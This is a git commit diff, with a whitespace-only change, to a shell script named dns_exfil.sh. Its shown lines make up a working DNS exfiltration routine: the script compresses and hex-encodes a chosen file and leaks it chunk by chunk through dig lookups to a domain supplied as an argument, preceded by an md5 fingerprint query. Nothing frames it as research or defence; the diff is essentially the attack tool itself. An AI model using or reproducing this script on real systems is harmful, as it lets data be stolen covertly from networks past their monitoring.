4e2b56c67606a6ab17db0959ba97bc2ac957767b
roboto2031 <roboto2031@gmail.com>
2014-09-26 01:12:26 +0000

    new stuff

--- shutils/dns_exfil.sh
+++ shutils/dns_exfil.sh
@@ -5,6 +5,6 @@ DOMAIN=$2
 
 dig `gzip -c $FILE | xxd -p | md5sum | cut -d ' ' -f1`.$DOMAIN;
 
-for line in `gzip -c $FILE | xxd -p `; do
+for line in `gzip -c $FILE | xxd -p`; do
 	dig $line.$DOMAIN;
 done;
